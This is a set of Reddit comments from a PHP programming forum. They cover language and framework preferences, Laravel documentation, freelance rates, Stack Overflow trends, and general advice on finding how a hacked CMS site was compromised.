+1 for Elixir and Phoenix. They're both so nice to work with and although their community is small it's incredibly friendly and helpful.
Started with PHP Checked out Node Came back to PHP because I found out I hate callbacks and promises as a primary design pattern Checked out Python Came back to PHP, but still use Python all the same PHP not only pays the bills, but I find it incredibly easy to get good, solid work up and running quickly. Python is excellent for tooling, scripts, cronjobs, and even writing the occasional website in the end, its personal preference. I cant stand Node or Ruby, but others love it. It just means I aint getting hired at a Node or ruby shop anytime in the near future lol 
I'd like to find multi accounts, not spam them.
+1 for FastRoute. Its seems a bit odd in the beginning but its super flexible. For one of my projects I ended up making the route syntax very similar to larval. Plus its fast!
Sure would love to learn C at all, anyone have any helpful tips for someone who is good with PHP to take the dive into something more real like that? (Sorry to hijack your thread)
Why just not to use [firebase](https://www.firebase.com)? 
I've put up many arguments, but all you do is explaining your arguments more and more. Being more vocal and ignoring my points doesn't make your opinion right, nor do the solutions that work for your use cases make them the only correct way for everyone. 
That's normally a function of the web server, not the executing script.
Pardon mine, but did you read the part where it says "for all their flaws"? It's the lesser of 2 evils in this scenario.
All node did is spawning and controlling a ffmpeg process.
psx vs apigility/slim/lumen/etc?
Wait 'til you get a call from one of my country men in the lines of "I am calling you from Microsoft... you have a virus and give me your credit card"... ha ha just kidding. As long as you're happy with your choice, I am happy for you.
Yes, but it has nothing to do with php. You have to set up custom error page on webserver config. I don't remember what error it was, but it's probably shown in the current error page. 504 maybe.
Correct on 504, or 524 if you're behind cloudflare
&gt;I currently work at a company as a PHP and Laravel Developer (9 to 5), but I am looking for some extra work. Ideally, I could do up to 15-20 extra hours a week. I shine at coding PHP in the Larvae framework. I also know fair amount of JS and CSS. I am very dedicated and I like to think outside of the box. I love starting new projects, finishing them and to feel pride in the work that I have done. &gt;I charge on estimated time. So if the job takes me longer or if I come across a problem I have to research then it's on me. &gt;My last project was to create a warehouse management system that {{ uniqueProjectRequirementOrImpressiveStatisticHere }}. I have also built {{ somethingInteresting }} and {{ somethingElse }}. I deleted the last bit (innovative present project) because it doesn't add anything useful if you don't disclose any information at all. If you want include that you have to provide more info even if it is only broadly describing your project and why it is innovative. I'm not saying that it's perfect; I'm just fixing up small errors where I saw them.
I don't know the stats but my last move from Ruby to PHP gave me a large raise.
Dear downvoters, OP said he wants a string returned and never mentioned executing it in a query. In fact, you can't get a string representation of a query with bound parameters applied, thus some manual work required.
I had to deal with this few times. First tíme it was some old non-actualised vulnerable CMS which opened doors to the server. Second tíme it was some forgotten old FTP account with weak password (I've identified this by examining FTP logs). Next time it was my fault - a locally stored password in my FTP client was stolen by some malware which infected my Win PC. And the last time it was my fault again - losely coded image uploading PHP script... Edit: I bet you have some vulnerable plugin in your website(s) or some of your website runs outdated version of WP/Joomla. So moving those websites to different hosting will not help you.
I am not sure if you understood the question in the title. There is no "never went back" anywhere.
Nice! I was asking in context to your observation about Node being hard to read. I would pointed out the simplicity of a WS in Node compared to setting up a tornado (for python). But, you are already using it, so kudos to you. 
You should try docker.
That is impossible to tell until you found the vulnerability that made it possible. You should check the joomla/wordpress versions and see if they had some security problems on your version. If your versions are rather old then the problem is obvious.
Put the whole site in git and copy over a clean copy of joomla of the same version and compare changes. Also do it the other way around, first joomla in git and copy over your files.. you might find files which do not belong there or if modified core files
My career has been so varied with both software and hardware I have covered large areas and projects. Its only really in the last 12months my work has been really focused on purely web based projects and ecommerce systems Feel free to fire away any questions 
Closed source and complete vendor lock in? If they pull the plug you're totally fucked
wp-cli's core verify-checksums may also help.
sqlite runs on any platform and is file-based rather than an intrusive, always-on service. Most all the apps on your smartphone probably use sqlite for their internal storage. It's the right tool for this job: storing your code that is to be analyzed - not for storing the data your code uses. 
Got it. Thank you. Maybe works for your demo case but not all user cases, I would think.
www.laracasts.com helped me get started, it's totally worth the monthly subscription and there are free videos. 
/r/laravel
&gt; If they pull the plug you're totally fucked The same can be applied for mysql. What if Oracle will "pull the plug"? Pretty the same probability. And anyway this is much more preferable way than just "HTTP access to mysql".
That's a bad comparison, especially with mariadb
Speaking as someone who also went down the road of trying to build a code completion engine, I really wish we could all combine efforts around one code completion engine, integrate with YCM, and call it a day. There are already editor integrations for YCM. No need to reinvent the wheel. etsy/phan already does a ton of this work, and it does it really quickly thanks to the php-ast extension. Just need to build a plugin that saves the results of the analysis somewhere, and a really thin daemon that serves up the info to YCM. One of these months, I'll get around to building it if someone doesn't beat me to it.
Not sure it will be possible. We have a template editor where our users can edit their templates, which can then be presented to the users' clients.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Mustache for example definitely has client-side distributions. The difference between client- and server-side-rendering should for you only be that instead of binding the values you output a small piece of JS which binds them, most other things should stay the same. I'd say it's worth a try.
Did anyone get any of the features working. I couldn't find any instructions either on the wiki or on the website, I downloaded all the packages and only configured the php executable location, but nothing works
okay, try it and report back in 3 months, NoSQL isn't all it's cracked up to be.
The official docs for Laravel 5.2 had a tutorial on how to build a basic task list: https://laravel.com/docs/5.2/quickstart It helps to get you familiar with it. 
$100/hr isn't even a significant fraction of the value a talented freelance developer can create for a company. It's a bargain.
I must definitely be an impostor beginner developer then. I always knew it!
It worked for me. I went to file &gt; add project folder and selected my project. Then I went to Packages &gt; PHP Integrator &gt; Set Up Current Project, and then to Packages &gt; PHP Integrator &gt; (Re) Index Project. 
I wonder if this has any features that PHPStorm lacks.. I am especially interested in refactoring features.
CI doesn't adhere to, not a bad thing depending how you look at it, the MVC pattern. The main application is more akin to the [singleton pattern](https://en.m.wikipedia.org/wiki/Singleton_pattern), essentially making global variables. The learning curve is not steep making it easy to get up and running. However, once you start learning more, you may outgrown the applications structure. Laracasts is a great resource, it is paid service but the video series that should get you up and running, is [free](https://laracasts.com/series/laravel-5-from-scratch). 
So much this. Laracasts is an excellent resource for beginners in Laraval and is incredibly detailed and accessible to any skill level.
Where do you live? I get paid almost 4 times that as someone with only 1 year professional experience. 
Specifically this free series: [Laravel From Scratch](https://laracasts.com/series/laravel-5-from-scratch)
Everything you need to know is in the docs, you should spend the time to read through them. 
Dear downvoters are too narrow-minded and can't grasp the idea of anything that is out of the very basic line. An idea of the possible use case for such a task, *debug output* for example, never occurs to them.
There is no documentation whatsoever of most of the methods and classes of Laravel. Just one example from last week: the validator object may return a MessageBag with -&gt;messages() but there is no documentation on what MessageBag is, and what methods it supports, you have to look at the code. This is just an example but sadly most of Laravel have no documentation or bad documentation where stuff is only explained superficially. This is a real problem. Another example from today, is in the migrations doc there is no help in how you can execute a single migration and not all of them.
Thanks for the examples. I'll try to submit changes for them, but there's obviously more to be discovered/done. Would you be open to a more thorough review of them? I know it's a lot to ask, but I think it would be helpful to others trying to learn the framework. Anyway, interesting it discussing ways to make it worth your time...
Course its possible. If its parsed, its possible to exploit it. Question is, are the common template engines hardened enough? Thats a difficult question.
All work I've done in C++ has either been server based (CLI) or 3d game/engine, so depending on the use case, if it requires mysql i use pogo, network I use r3dnet, GUI (rendering) DX3D. but 80% of the time you will be making your own tools(kit). You know those idiots that seek attention at PHP talks "don't use frameworks" bullshit. Well take everything they say, replace PHP with c++ and it's correct. I wrote my own class for handling cli commands, I wrote my own 3d glow class for, inner, outer, surface and object etc glow.
Does anybody know of any good PHP conferences located in the US for 2017? My work is letting us pick a few conferences next year and I am not really sure what to put in for/
Most of these conferences will have 2017 dates but this schedule is still for the rest of 2016: https://github.com/GeeH/php-confs/blob/master/events.md You can also follow the [CFP Report](https://thecfpreport.com/) to hear about upcoming conferences. It comes down to a lot to what you want to get out of a conference. There's a number of smaller, regional conferences that give newer speakers a chance to talk. So the talks there are hit and miss, but you don't have the cost of the big cons. And then you have something like php[world] which is like 5 different tracks with lots of big names, but it is crazy expensive comparatively. Plus, don't forget, SunshinePHP and ZendCon are good excuses to get your job to pay for a vacation (Miami and Vegas, respectively). 
Take all the advice regarding prices with a grain of salt here on reddit. Most of the folks are American and assume you are too. A very, very large portion of the world has rates which aren't comparable to US. South America, a big part of Europe, most of Asia, most of Africa.
Dreamfactory https://www.dreamfactory.com makes building out REST API's quick and easy. It is built on top of the Laravel framework and is open source. I have used it now on 3 projects and it was super painless.
Yes, they are redefined. PHP defines them here: http://php.net/manual/en/features.file-upload.errors.php They should not be defined again.
Yep for multi file upload but the class needs a little bit of redesign. For error constants name, I saw them on the PHP doc but didn't find any trace of them as real constant.
You make it sound like any parser starts out as an open door and then needs to be "hardened" through some iterative process. But a good template engine should be little more than a limited programming language. If the engine parses the template according to well understood parsing techniques (for example, with a recursive descent parser) there should be little room for exploits in the engine itself. Any operation done by the template can only be done if the engine itself implements it. It may be that most template engines implement unsafe operations (a lot of them allows us to break out into pure PHP context, for example). But that is not a reflection on parsing as a concept. Those possible exploit holes are there *by design* in these engines. They have chosen to implement unsafe operations. So they start out secure and then gets less secure by an iterative process.
Nice! +1 for the `You know those idiots that seek attention at PHP talks "don't use frameworks" bullshit`. I was planning to work on a personal project using C++, developing an editor like Sublime. I say "like" because, may be I would end up re-inventing the wheel, but, it is just for the pleasure/pain of it. So, I was investigating my options and turns out that it is either Qt or Gtk. I hate Qt and Gtk is not going to give me native look and also its performance on non-native Gtk platforms sucks. So, I investigated the Sublime GUI layer and the creator has his own framework. So, I guess you are right in saying that, `but 80% of the time you will be making your own tools(kit).` All the work I have done using C/C++ is doing either embedded systems or visual identification/object recognition on robotic platforms. Lol! after that, I should not have to create (an)other gui framework. But, I guess that is my only choice.
Changing default paths (storage, environment etc.). There's not a single mention of such possibility in the docs, and it's a pretty big deal.
Will PHP get some form of advanced JIT handling for ludicrous speeds?
What has changed at our team: PHP 7 is a serious improvement over PHP 5, use it at all times. Apache running PHP as mod_php5 is considered slow. Use PHP7-FPM. Nginx appeared as alternative to Apache. Some consider it better for sites with heavy traffic. Our team switched to Symfony framework (from Zend framework) for larger applications.
Well, yeah, I did that too, but didn't work. I really want to like atom, looks so nice, but I just haven't found php tools comparable to the unes I have in sublime
Completely pointless comment, MySql is open source so if they do pull the plug you're not totally screwed, I thought everyone moved over to MariaDB years ago for this reason anyway?
What use is there to find? SO will eventually cover most non-trivial questions and everything else will be flagged as duplicate or too broad or too specific, it's the way it governs itself. It's not a discussion forum. 
&gt; Why are PHP questions on Stack Overflow in decline? Probably because almost all PHP questions have been Q&amp;A'd already. Whenever I google PHP related questions, most of the results are from StackOverflow with good answers.
Hi! I will be working on a project soon, it is a kind of social network and the "chief" on programming there has some strange solutions to me. He tries to use as few packagies for frontend as possible (eg no bootstrap). And he also doesn't like any of backend frameworks (yii, laravel, symfony) which is for less "layers of abstraction" and for framework developers independency (we can write any of this stuff on or own and do not depend on someone). What are your thoughts on this sort of approach? If I made mistakes in definitions, feel free to correct me.
By chance, can you remember a recent example? In my experience most of answers I can find are rather outdated and too sketchy. Or there is no answer at all, and I have to ask a new one, but get no answer. 
Point noted
Well, my impression is based on the following remark he did, &gt; Sure enough, I dug some interesting data, but I'm still not quite sure what to make of it yet. and on the questions he asks (to me there are more questions than answers in his post). 
Oh no, COBOL is.
Then JavaScript is probably not far behind. But don't forget ABAP.
Metoo and B and pretty much hated too.
Yep, the service container whole goal is to hide the instantiation logic to your business code. In that way, your services being injected into your controllers or other services, you don't have to care about how it is being configured. But you don't design an API with the container in mind, you just design it without first. Of course, thinking about inversion of dependence will greatly help for the service container configuration later. Just think about object dependencies, how to reduce them. Don't split your code into many classes if you don't need it too, because too much decoupling will probably make the whole harded to understand and maintain (decoupling is good for maintainance, but too much decoupling is your worst nightmare). Just write your code to be fast, efficient, the smaller possible, and make it solve 80% of your problem. Unit test it, then later think about how hard will you need the 20% missing, and if so, how to extend properly your design for your edge cases. NEVER ever over-engeneer the stuff. Just make it work. Isolate it from the rest, don't make stupid dependencies (don't load a 50k+ lines dependency if you can just copy/paste 10 lines of code). Make it the simpler possible.
The most used languages are often hated, because beginners do all their work in them and their work is often weak, unsurprisingly. It was the case with VB, then with PHP, and now with Javascript. They are all very loose, fault tolerant languages lacking in rigour that are quick for beginners to learn, and in the case of PHP and JS, have lots of bad or inconsistent language design and other footguns that would make C++ blush That said, applying a top layer of rigour in the form of a framework or good practice can make both PHP &amp; JS into strong, useful tools that are often the *right* best choice for web work
Yeah, I know, simple is good :). RIght now in our application the controllers are just a bunch of if statements for the input validation &amp;&amp; the business logic validation. I want to write cleaner code for this and I thought that design patterns can be helpful here to refactor the code in a "standard" and maintainable way. Yep, I know also that I don't have to over-engineering the code, that's why I asked the question here :)
We run our builds using gitlab-ci-multi-runner on docker, when you enable cache it'll create some containers that are used to store the cache, so pointing composer's cache folder to the /cache folder in docker allows us to utilize the caching abilities of composer.
First of all: do you have unit tests? If you fear your own code, you will be reluctant to change it, even if that is the correct way to deal with the problem. Instead, you will bolt on these anomalies or worse, cut corners adding to your TechDebt. Second: understand the business needs. Why do they need these changes? Try to model your code to follow along with the business needs/processes. A very good paradigm to use is Domain Driven Design: it will allow you to communicate with the business in a way that benefits both parties and tries to remove any (mis-) communication problems. Third: try to build your application without thinking about stuff like Controllers, Databases and Views and all this other MVC crap they keep bombaring you with. Build your objects cleanly and simple. Make them reflect the "real world" or in this case your "business needs". This is the exciting part. Once they can create the desired outcome, you can worry about the boring part: persistence and presentation and all that jazz. 
`Are you writing more code for the same results? =&gt; Stop it.` I prefer to write more code that nicely encapsulates responsibilities and like to add indirection to reduce coupling but I guess I've been doing it wrong all this time.
Yeah, for just input sanitization I can use a library indeed. But my application goes beyond the simple input validation, it checks also for very complicated business rules and that's why I think I really need a design pattern well structured for doing this.
&gt; If you need a number to work with: Regardless of how severe your impostor syndrome is, never go below $100 USD per hour. Money has relative weight in different parts of the world. This forum is accessible worldwide. Your advice might as well read as: "Never go below 5 an hour" "5 what?" "It doesn't matter, just don't go below 5"
You should try programming in PHP without the PHP doc then. You know "The details of each method should be explained by the code itself." Good luck if you try that (and the PHP code is usually pretty good, but it's still not the same as a documentation).
At this point PHP's image problems are just that: image problems, not technical problems. Trying to figure out the technical roots of an image problem is a dead end. Instead manage your image. If a client doesn't care or know what PHP is, don't tell them "I'll code in PHP for you", just tell them "We're using modern technology to build your website". If someone doesn't care about your PHP experience, don't mention it. If they do, then mention it. And if you think about it, you don't program *only* in PHP. You at least program also in JavaScript. Maybe also Python. Maybe you dabbled in Java. So don't describe yourself as a "PHP programmer", but as a "programmer with experience in PHP, JavaScript, Python...". In the end, everyone loves a winner. If your results are great, no one would come and tell you "but you did it in PHP". They'd be in a corner, sitting quietly and wishing they were more like you.
Yeah. I have seen the feature. My CI server unfortunately is not so smart.
The advice is golden! USD are relative to every other currency on the planet! You have to pay taxes, buy equipment, take out loans, get subscriptions to popular publishers, pay others to or take time to market your business, hire an accountant, an attorney pay for contracts, etc. It costs a lot more than many think, or they cut corners and do not realise how dangerous they are! The only reason employment is such a good option (to both parties) is the low-risk threshold (sometimes due to low self-value, but not always), but like all investments low-risk = smaller return. Also by charging more you already know you can talk with authority, have more financial security which leads to better decisions and more ability to engage in opportunities.
I haven't worked with Node, not backend, but I've worked well enough with ES6 and could probably get started on a backend NodeJS. I've done a little bit of Golang, and my main reason applies equally well to ASP.Net and Java (Or at least, it did well enough last time I looked at them). PHP is quite possibly one of the most well documented languages I have ever come across. Not in terms of the fact that every function is completely documented, or you can almost always find the reason why something is edge-casing, I don't care about those nearly as much and they may not hold true. PHP's documentation website reads as a tutorial for each function. When I learn a new function, I get an explanation of it, a couple of use cases and I can see proper usage. In comparison, most languages don't do so good. Golang has an actual tutorial, which is great, but it doesn't do as well (in my opinion) of making each documentation page user-friendly. Python is the exception here, it's documentation is at least as good, if not better. If it is better, it's because their documentation is ordered like a tutorial that you can learn from. So why PHP and not Python? Honestly, it comes down to market share. First, I'll find more high paying jobs more easily in PHP. Second, it'll be easier for my company or client to find a PHP Developer to read, maintain and expand on my code than a Python one. Staying at one company for a decade doesn't seem on the books any time soon, and I can't control what will happen once I'm gone, but I can ensure that I choose to write in a language that's more likely going to be easier to hire someone on to maintain. Unless the company specifically says they don't care about that, and wants benefit X, Y or Z, in which case I use the language best suited to that
Perhaps you could implement MurmurHash3 as a PHP extension. MurmurHash is a non-cryptographic fast hashing algorithm that can be used to hash text into a fairly unique 32, 64 or 128 bit integer. It is great for using when building search indexes based on keywords (amongst other things). There are implementations in most popular languages, here is the C version, the source file is 312 lines of code: https://github.com/PeterScott/murmur3 
Why on $50/hr would you not simply say it's an estimate and at the least wait for the client to ask about flat-rate services and overage? (It should double cost for flat-rate at least!). If the client asks why; explain risk to them... "I feel strongly enough to offer you the lower rate, allowing you to shoulder some of the risk and get a price-benefit. If I absorb all of the risk, I feel it's worth at least 2x" to know your project will be completed. I also multiply for guaranteed delivery times as failure to deliver could incur a penalty that costs you (even if just from project total), and extended payment terms. Everyone knows what an estimate is, everyone wants to behave like a toddler in a candy store. Your job is at least in part to stop them, not to create a generation of brats who rot their teeth eating s#!t and then complain... That is for the public sector
An appeal to authority fallacy is actually an appeal to INAPPROPRIATE authority. Referencing experts isn't an example of that fallacy. Saying, for example, "according to this medical journal, cancer is bad" isn't an example of the fallacy. Saying "according to my friend Bob, a (weather) researcher, cancer is bad" would be.
&gt; PHP 7 is a serious improvement over PHP 5, use it at all times. Which improvements you find most important at your team? 
Thank you for this. I can finally understand what is going on at least. What would you recommend after finishing that?
one example: we pay every user 10$ for signing up, thats why we do A LOT to detect multi accounts, from using google cid, cookies, gmail email fragments, etc. 
Sounds like it's going to be a bitch to maintain...
It is going to be a bitch to maintain.
This would be a good way to do it. $userAttr = $app-&gt;request-&gt;put('users'); Where the body of your request could be... users[email]=a@a.com&amp;users[username]=geggleto
that can be done with nany email providers, theres no way to detect that just by the email string. also its harder to script it. i.e. with gmail i can just quickly register hundreds of accounts on a platform just with doing adress+account1@gmail.com adress+account2@gmail.com ... and so on, to do that with email aliases is much harder, you'd need to have access to the mail server/system itself or implment an API ... if you have spam-prone portals like for instance a blogging portal, you will see those gmail account types with +something or moving points very very often (i have literally thousands a day that would be created if i'd allow it) 
I monitor the Symfony 2/3 tags on stackoverflow. There is a manageable number of questions (20-30 per day). Some are dups or just plain incomprehensible. I think that because Symfony is considered to be a "higher level" sort of framework that the question are probably a bit more interesting than most. Every so often I check the php tag. Seems like there is several question per minute most of which are very low quality. It's the usual problem that new developers think that stackoverflow targets them when instead stackoverflow is more focused on developers advanced enough to know how to ask questions properly. At the very least, you have to know how to tag them otherwise the question will quickly sink out of sight. I do have enough rep on the site to where I could help review (and close) low quality questions. But frankly, I find that to be boring so seldom do so. It is a bit interesting when every so often a "gung-ho" closer comes along and wants to close question after question regardless of the quality. They don't last very long. In the last 5 years or so I have asked six questions (none of which were php related). Three were answered. Three were ignored. Which I think is quite reasonable. Of course during that time frame, I have hundreds (perhaps even thousands) of my questions answered with existing answers.
Keep an eye on [Functional Programming in PHP](https://www.phparch.com/books/functional-programming-in-php/) We're currently working on the 2nd edition of this book which includes changes through PHP 7 and has twice as much content as the first edition.
I'm pretty sure you can extract these social media links with an regular expression. e.g: $re = "/(?&lt;domains&gt;((http|https):\\/\\/)([a-zA-Z0-9\\.-_\\/]*)\\.([a-zA-Z]{2,})(?:(\\/([a-zA-Z0-9.-_\\/]*))))/"; $str = "http://facebook.com/profile is as cool as https://www.twitter.com/randomprofile is"; preg_match_all($re, $str, $matches); var_dump($matches["domains"]); Im not that good with regular expressions, so please improvie or correct this one. (that one above would give you all domains that are in the page (at least I hope so))
Btw: awesome tool for testing regexp expressions: https://regex101.com/ I also think that a simple regexp would be enough :)
Yeah, I should. It was more of an exercise for myself, but I'll work on updating it. 
Some patients might do you well, considering that comment is at +7 karma now. Maybe wait more than 3 hours before complaining about another post's downvotes and declaring your self a proud Reddit martyr. 
Hello, I want my reset password link to be valid for one hour. My app has crypto (defuse lib). Do you think it's a good idea to put the validity time in the reset link, encrypted with the server's secret key? The link would be like : reset.php?key=1234abc...123abc&amp;userid=1&amp;date=123abc? An attacker would have no way to change the date param to make it a valid date. Amma rite?
I have retired from programming in PHP professionally for a time already. I guess sometime before the slope. My opinion is that all real good developers that worked with PHP migrated to other programming languages. That coincided with steady decline of PHP salaries in some markets and some open PHP bashing. Nowadays the people remaining are those who are financially invested in PHP, such Laravel or Symfony team, or those who derived value be being long timers in PHP. Even novices, the ones that stick with PHP for a while, at a certain point don't know whether staying is the right thing to do. I see reflection of this opinion in op's analysis. Paradoxically, this exodus is now helping to improve salaries again. With that said, novices in PHP also tend to be novices overall, and thus they would have no idea on how to ask for help in Internet... That's not entirely unexpected or surprising.
Right off the bat, I found: [https://packagist.org/packages/misd/linkify](https://packagist.org/packages/misd/linkify) Personally, I like to use [Google for searching for packages](https://www.google.dk/search?safe=off&amp;q=site%3Apackagist.org+url+in+text&amp;oq=site%3Apackagist.org+url+in+text&amp;gs_l=serp.3...3242.7176.0.7268.8.8.0.0.0.0.150.528.5j1.6.0....0...1c.1.64.serp..2.0.0.vRXcAP3Ozc8) rather than Packagist's own search function, which - unfortunately - isn't very good. Remember to **never use regular expressions for parsing HTML**. Instead, use a virtual DOM (e.g. [DOMDocument](http://php.net/manual/en/class.domdocument.php) or [symfony/dom-crawler](https://packagist.org/packages/symfony/dom-crawler)), iterate through all nodes, find all **text nodes** and apply the scans for URLs on these text nodes, exclusively. Good luck :)
No, COBOL or BASIC would be many peoples first choices but PHP is certainly in most peoples top 5. I love PHP, its my main language but I also hate it because it makes it easy for none programmers to produce truly awful *working* code which makes everyone think PHP is bad even if they haven't tried it. PHP does have a lot of bad points, my biggest gripe is its very inconsistent API.
I think that PHP got a bad reputation due to the rough transition it has had. The language has had a long history and it has taken time for it to come into its own and adopt some of the features that shinier, newer languages had by design. With that said, I think that PHP7 is awesome and is definitely shaking off the bad reputation PHP once had. Frameworks like Laravel also help :)
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Could be a personal project, collecting stats, etc.
Yeah, there are many PHP frameworks that do their job just fine for the majority of developers. But there is no all-inclusive framework for c++. The specific needs for every developer and their app's are way too broad for any framework to cover. There are frameworks to a specific thing, But you will never use them unless you are doing that specific thing. also about your sublime text idea, https://github.com/limetext
At a previous job, I wrote a high-precision timer so we could profile specific parts of our codebase in production without the overhead of a full debugger (it made sense at the time). One requirement is that it needed to use the monotonic clock (which never gets reset backwards like the normal clock can), which PHP doesn't have access to (although it will fallback to the regular clock if needed). For the curious, it's at https://github.com/metaloha/phpTimer (and a Python version at https://github.com/metaloha/cTimer). It is not particularly well tested, was written in a bit of a rush, was my first extension for PHP and Python (and has not been updated for some time, so YMMV) - but it worked perfectly well for what we needed it for at the time :)
Ok, I use nosql for about 1.5 years (30% nosql with mongodb, redis and last 3 month firebase and 70% postgresql + jsonb) and I had problems only when I didn't know how to model data for nosql and when to use it. Here is when I use firebase: - for stupid CRUD applications without complex querying - for realtime data (notifications, chats, location tracking) - for fast prototyping (when working as frontend dev) Here is where I don't use firebase - When you have complex queries. It's not trivial with firebase to model all data aggregations upfront and also you need backend which is eliminates most of the profit. - When you deal with secure sensitive data But the OP just wrap mysql (which doesn't know anything about your domain logic) and made very stupid CRUD. This case is totally covered by firebase. There is no silver bullet but it's better to use firebase that do what OP offers.
i mean that wrapper is stupid, i'm cool with mysql (but switched to postgres 1.5 years ago).
My statement was conditional for a reason. If "you need a number to work with": Start with $100 USD then consider exchange rates to calculate your rate). Else: You don't need this advice, so disregard it.
This is true, but there's no reason the folks reading this forum can't work remotely for American companies (step 1: start a company, step 2: have American companies hire your company to provide a service) and get paid the same wage as the rest of us.
Don't worry, I can assure you PHP still has plenty of awfulness. Things get better bit by bit in some areas, but there's still lots of horrid legacy that pervades the language and its ecosystem. Much of which is basically PHP-exclusive, as other languages don't have these problems. That's not to say that PHP isn't useful or whatever, but the complaint that criticisms of PHP are outdated never holds much currency given most of what is complained about is still there (and that's just for PHP 7 or 7.1 or whatever; consider that the latest version is not the most widely used).
[removed]
[removed]
Change your opinion of the quality of the answers.
Maybe I'm not looking in the right places, but I can't really draw that comparison. Could you elaborate?
3 years is an iffy timeframe because I was working with both versions 5.2 and 5.5 at that time. If you were working with 5.3+, then little has changed compared to how much 5.3 changed the language. If you haven't had much involvement with 5.3+ then a whole lot has changed from 5.2-7.0. Use 7.0+ whenever possible due to the complete rewrite of the parser to implement an abstract syntax tree to better compete against hhvm in terms of processing times and memory usage. Prior to 7.0, many were migrating to hhvm in droves due to its better performance in general computations. If your bottlenecks were with the database or third-parties before, then they're likely going to be the same today. If you're doing data processing, then the improvements are quite significant in what I've been dealing with. If you never got to 5.3, then I recommend you just start reading up on the [changes shown in their appendices](http://php.net/manual/en/appendices.php) because that's where namespaces, closures, and lambdas came into being. If you did use 5.3, then I actually somewhat hate to beat this dead horse a bit, but [php the right way](http://www.phptherightway.com/) does provide a good starting point in addition to the appendices above for you to gather enough information to form your own opinions on matters. Language-wise traits, variadic functions, splat, exponentiation, three-way comparison, and scalar type hinting are some of the big points. Other than that, a lot of the changes are with the community. The big guys three years ago were mainly built on Zend and Symfony; they're still around, but much more modularized so aren't nearly as monolithic. Many of the projects and frameworks got together and formed php-fig, did some good things (PSRs 0,1,2,4), went overboard (PSRs 6,7), and then got religious about their organization and have been close to imploding for a while. Most of the community has leveraged some of the PSRs that came from php-fig to "standardize" on a packaging system similar to pip via composer and packagist; be cautious of dependency hell when leveraging it because as with any community that advocates heavily on "don't rewrite" it can be a rabbit hole for the simplest of things. To note since you come from java recently, there are no generics and especially no annotations in php. Some systems like Doctrine and some dependency injection containers like using docblocks and reflection to fake annotation support like java has, but there really aren't annotations in php. I must mention this. If you spend enough time here, you'll come to think that Laravel is the only player in town anymore, but it's not. They have a sizeable, albeit somewhat viral community. Laravel began as a usability layer on top of Symfony that has grown a bit out of control and puts everything in the global scope behind what they call facades (to avoid confusion, it's the literal English/French definition and not the software pattern definition they use; huge arguments were had by many over that subject alone which I don't want to revisit). I'd say it basically took the place that code igniter once had of a user-friendly framework that tried to do as much magic for you as possible; great for some, frustrating for others. Essentially, if you knew and were familiar with 5.3, then almost everything with the language itself will remain familiar for the most part, 7.0 sped up processing and reduced memory footprints, and they sprinkled in features here and there as they went. If you're supporting older versions, then knowing when the sugar was sprinkled is needed, otherwise start with v7 and go from there.
&gt; At the end of the day, I said fuck it, I need to actually get shit done. So I closed WebStorm and opened PHPStorm. Welcome back to sanity.
I didn't go too far with Node for back end. Seemed odd to me that a server needs to be reset in order to see changes in your code take effect, and using a script to auto-detect changes to forcibly reset the server sounds like a hacky solution. I just use Node for downloading packages. However, I found React to be pretty a interesting and nice way to render views for SPA's. I too tried Angular but it was pretty unwieldy for larger apps, and React is better in that respect. I still use the xAMP stack for the backend using a custom PHP API to deliver the data to the front end. 
The majority of problems that aren't easy to avoid are those that you don't anticipate. And therefore you can't list, when asked.
That's a fair point. Feel free to go below that threshold until you learn more about marketing yourself to high-value clients.
Hmm? &gt; Reddit martyr That escalated quickly. 
Seconded. I like to use [nikic's FastRoute](https://github.com/nikic/FastRoute) to route requests to an appropriate controller, the just read from `php://input`.
[removed]
Will do! I was looking for something like this!
You should be able to share more code than that (between the client and server). Webpack does a good job of handling CommonJS/AMD/Universal packages. As far as I'm aware, Bower is on its way out and you can just use NPM for everything. A few packages might need shimming to make properly, but you can set it up such that your `require` will include a different package when bundled for the browser. The speed advantages of Node aren't that your code runs any faster than PHP, I'd say its advantages are twofold. (1) the async nature of JS means that you're running SQL queries and other IO intensive functions in parallel *by default* rather than one after the other as you would in PHP. (2) You're not boostrapping your app on every single request. i.e., you're not opening a database connection, constructing controller and DI containers, loading configurations, etc. All that crap is done once when the server loads and then is held in memory. In the PHP app I'm working on, that bootstrapping takes about 1 full second before it even starts processing the actual request. That's insane! The npm tooling is a bit nutso, I'll hand you that. But a lot of it simply doesn't exist for PHP. How many people lint their PHP? How many errors could have been caught by doing that? How do you manage your assets without Node? With webpack, if I accidentally delete an image or CSS file, my project doesn't even build so I get an error at build-time rather than a broken image at run time. Some of this is do-able with PHP, but mostly people don't. And if you did, you'd have more or less the same nasty stack. 
Oh god, Meteor was a total shit show for us. I still have nightmares. We tried to move from Perl/PHP/MySQL to Node.js/Meteor/Mongo. One of our engineers decided it was the best solution (and it really looked to be at first glance). Installed everything, wrote some code, and little (mostly DB&lt;-&gt;node related) bugs kept popping up in the server. Because the stack was so cutting edge we couldn't actually find anybody who had a similar issue and we spent weeks trying to solve them. Luckily it was soon enough in development of our rewrite to just rewrite it in PHP. A year later and all is well. I still wish we got it to work because Javascript is pretty fun, but life goes on and we are producing.
What is this thing? Looks like a friendly way of writing extensions? If you really need incredible execution speed from PHP, you could do this, but you're introducing weird dependencies on a relatively unknown project. Better just to use a different language if the execution speed is that important. Go seems like a reasonable choice. But really, when would execution speed be that important?
You got downvoted for explaining how every programming language does it...lol.
Did i mention i was intermediate? Not an expert? :) And yeah, this figure is way over what i was thinking about.
and when it's shrunk in a tab header it looks a bit like a monster
&gt; Take a look at stuff like ReactPHP and faked parallelism through Co-routines. It's not "fake parallelism", it's "real concurrency". The distinction is not arbitrary.
